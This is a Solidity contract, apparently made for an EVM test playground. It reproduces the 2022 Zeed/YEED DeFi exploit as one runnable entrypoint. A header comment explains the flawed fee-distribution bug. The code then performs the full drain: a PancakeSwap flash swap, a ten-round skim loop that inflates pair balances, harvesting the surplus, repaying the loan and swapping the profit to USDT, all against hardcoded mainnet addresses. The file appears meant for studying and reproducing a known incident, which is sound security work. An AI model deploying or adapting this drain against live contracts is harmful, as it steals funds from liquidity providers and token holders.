// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Zeed).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest is Test`
// contract: testExploit() approves the router, triggers a PancakeSwap flash swap
// on the USDT/YEED pair, and the `pancakeCall` callback (seed transfer + 10x
// round-robin skim loop + harvest + flash repayment) lives on the test itself.
// The final YEED->HO->USDT router swap also lives in testExploit() after the
// callback returns. There is therefore no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit body + pancakeCall copied verbatim, with the router cash-out
// moved into the callback so the whole thing runs under one entrypoint `run`).
// Logic and constants are copied verbatim from test/Zeed_exp.sol.
//
// Root cause: YEED's `_takeReward` fee-distribution handler computes three
// correct reward slices (usdtReward / zeedReward / hoReward) and emits them in
// the Transfer events, but the actual storage mutations add the UNSLICED full
// `rewardFee` to each of the three dividend pairs' balances. Every sell-side
// transfer therefore donates 2x rewardFee of phantom YEED balance to the three
// pairs collectively, desynchronizing balanceOf(pair) above the cached reserve.
// PancakeSwap's permissionless `skim` sweeps that surplus — and because a skim
// INTO another registered pair is itself a sell, it re-fires `_takeReward` and
// re-inflates all three pairs. A tight round-robin skim loop compounds the
// phantom balance into a large harvestable surplus, which the attacker skims
// to itself, repays the flash loan, and dumps the remainder via the router.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract ZeedDrain {
    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x6CD71A07E72C514f5d511651F6808c6395353968));
    IPancakePair constant usdtYeedHoSwapPair = IPancakePair(0x33d5e574Bd1EBf3Ceb693319C2e276DaBE388399);
    IPancakePair constant usdtYeedPair = IPancakePair(0xA7741d6b60A64b2AaE8b52186adeA77b1ca05054);
    IPancakePair constant hoYeedPair = IPancakePair(0xbC70FA7aea50B5AD54Df1edD7Ed31601C350A91a);
    IPancakePair constant zeedYeedPair = IPancakePair(0x8893610232C87f4a38DC9B5Ab67cbc331dC615d6);
    IERC20 constant yeed = IERC20(0xe7748FCe1D1e2f2Fd2dDdB5074bD074745dDa8Ea);
    IERC20 constant usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function run() external {
        yeed.approve(address(pancakeRouter), type(uint256).max);
        (, uint112 _reserve1,) = usdtYeedHoSwapPair.getReserves();
        usdtYeedHoSwapPair.swap(0, _reserve1 - 1, address(this), new bytes(1));
        // After the flash swap returns, all profit (USDT) has been forwarded to
        // this contract by the router cash-out inside pancakeCall().
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) public {
        // 1. Seed the victim pair — a sell-into-pair, so _takeReward fires and
        //    inflates all three dividend pairs with phantom YEED balance.
        yeed.transfer(address(usdtYeedPair), amount1);

        // 2. 10-iteration round-robin skim loop. Each skim moves the YEED
        //    surplus from one pair to the next; because the destination is a
        //    registered pair, the YEED transfer re-fires _takeReward and
        //    re-inflates all three pairs. Compounding phantom balance.
        for (uint256 i = 0; i < 10; i++) {
            usdtYeedPair.skim(address(hoYeedPair));
            hoYeedPair.skim(address(zeedYeedPair));
            zeedYeedPair.skim(address(usdtYeedPair));
        }

        // 3. Harvest the compounded surplus from all three pairs to self.
        usdtYeedPair.skim(address(this));
        hoYeedPair.skim(address(this));
        zeedYeedPair.skim(address(this));

        // 4. Repay the flash loan with the 0.3% premium.
        yeed.transfer(msg.sender, (amount1 * 1000) / 997);

        // 5. Cash out the remaining YEED via the router along YEED -> HO -> USDT.
        address[] memory path = new address[](3);
        path[0] = address(yeed);
        path[1] = hoYeedPair.token0();
        path[2] = usdtYeedPair.token0();
        pancakeRouter.swapExactTokensForTokens(
            yeed.balanceOf(address(this)), 0, path, address(this), block.timestamp + 120
        );
    }
}
